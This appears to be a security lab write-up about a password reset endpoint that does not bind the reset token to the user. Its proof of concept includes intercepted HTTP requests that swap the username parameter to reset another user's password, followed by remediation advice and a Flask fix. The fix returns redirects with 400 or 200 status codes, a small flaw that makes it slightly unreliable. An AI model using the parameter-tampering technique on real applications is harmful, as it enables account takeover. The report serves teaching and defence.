# Vulnerability Report: Arbitrary Account Password Reset via Unbound Password Reset Token Logic

* **Vulnerability Type:** Improper Authentication / Broken Logic (CWE-287) / Insecure Direct Object Reference (CWE-639) / Weak Password Reset Mechanism (CWE-640)

* **Severity:** High

* **Target Component:** Password Reset Endpoint (`POST /forgot-password`)

* **OWASP Top 10 Mapping:** A07:2021 – Identification and Authentication Failures

## 1. Executive Summary

A high-severity authentication vulnerability was identified in the password reset module of the application. The system allows users to reset their password using a temporary token delivered via email. However, the handler processing the password update accepts both the token (`temp-forgot-password-token`) and the target username (`username`) as mutable POST body parameters. Because the server fails to verify that the token belongs to the submitted username, an attacker can generate a valid reset token for their own account, swap the `username` parameter to target any arbitrary user (e.g., `carlos`), and force a password overwrite to achieve complete account takeover.

## 2. Technical Analysis & Root Cause

The flaw originates from flawed business logic and missing parameter binding validation in the password reset submission handler.

### Vulnerability Mechanics

1. **Token Generation:** Requesting a reset for `wiener` issues a valid `temp-forgot-password-token` stored in the database.

2. **Validation Gap:** When the password reset form is submitted, the server performs two isolated checks:

   * Is `temp-forgot-password-token` valid and unexpired? (Passes)

   * Update the password for `request.body.username`. (Executes query directly using client input)

3. **Identity Spoofing:** Because the server does not enforce `token.user_id == request.body.username`, supplying `username=carlos` causes the server to execute `UPDATE users SET password = :new_pass WHERE username = 'carlos'` using `wiener`'s valid token.

```
[ Attacker: wiener ]
          |
          | 1. Request Password Reset for "wiener" -> Receives valid token T1
          | 2. Submit POST /forgot-password:
          |    token = T1
          |    username = "carlos"
          |    new-password = "AttackerPassword123"
          v
[ Application Server ]
          |
          | 3. Check: Is T1 a valid reset token in DB? YES.
          | 4. Missing Check: Does T1 belong to "carlos"? NO CHECK PERFORMED!
          | 5. DB Query: UPDATE users SET password_hash = ... WHERE username = 'carlos';
          v
[ Carlos Account Compromised ]

```

## 3. Proof of Concept (PoC)

1. Navigate to `/forgot-password` and enter `wiener` into the username prompt.

2. Access the email interface and retrieve the password reset link containing the token:

   ```
   GET /forgot-password?temp-forgot-password-token=a9f8b7c6d5e4...
   
   ```

3. Click the link to load the password reset form.

4. Submit a new password (e.g., `AttackerPassword123`) and intercept the HTTP request in Burp Suite:

   ```
   POST /forgot-password HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   temp-forgot-password-token=a9f8b7c6d5e4...&username=wiener&new-password-1=AttackerPassword123&new-password-2=AttackerPassword123
   
   ```

5. Modify the `username` parameter in the request body from `wiener` to `carlos`:

   ```
   POST /forgot-password HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   temp-forgot-password-token=a9f8b7c6d5e4...&username=carlos&new-password-1=AttackerPassword123&new-password-2=AttackerPassword123
   
   ```

6. Forward the request and observe the `HTTP/1.1 302 Found` response redirecting to the login page.

7. Authenticate at `/login` with username `carlos` and password `AttackerPassword123`.

8. **Result:** Access granted to `carlos` account dashboard. Account takeover confirmed.

## 4. Impact

* **Arbitrary Account Takeover:** Attackers can reset the password of any registered user without requiring victim interaction or access to the victim's email account.

* **Full Application Compromise:** High-privilege and administrative accounts can be targeted, leading to complete infrastructure takeover.

* **Broken Authentication Integrity:** Total breakdown of password recovery trust boundaries.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Bind Reset Tokens Cryptographically to User Identities:**
   Do not accept the target `username` or `user_id` as a client-supplied parameter in the reset POST body. Derive the target identity directly from the validated token record stored in the database.

2. **Single-Use and Short-Lived Tokens:**
   Ensure tokens expire immediately after use and maintain a strict, short expiration window (e.g., 15 minutes).

#### Secure Code Implementation Example (Python / Flask)

```
from flask import Flask, request, render_template, redirect, url_for, flash
from werkzeug.security import generate_password_hash

app = Flask(__name__)

@app.route('/forgot-password', methods=['POST'])
def handle_password_reset():
    token_value = request.form.get('temp-forgot-password-token')
    new_password = request.form.get('new-password-1')
    
    # 1. Fetch token record directly from DB
    token_record = db_get_reset_token(token_value)
    
    # 2. Validate token existence and expiration
    if not token_record or token_record.is_expired():
        flash("Invalid or expired reset token.")
        return redirect(url_for('forgot_password_request')), 400
        
    # 3. Derive target user identity STRICTLY from token record (ignore client username input)
    target_user_id = token_record.user_id
    
    # 4. Update password securely for the derived user ID
    hashed_password = generate_password_hash(new_password)
    db_update_user_password(target_user_id, hashed_password)
    
    # 5. Invalidate token immediately
    db_invalidate_token(token_value)
    
    return redirect(url_for('login')), 200

```

## 6. References

* **CWE-640:** [Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html)

* **CWE-639:** [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

* **OWASP:** [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)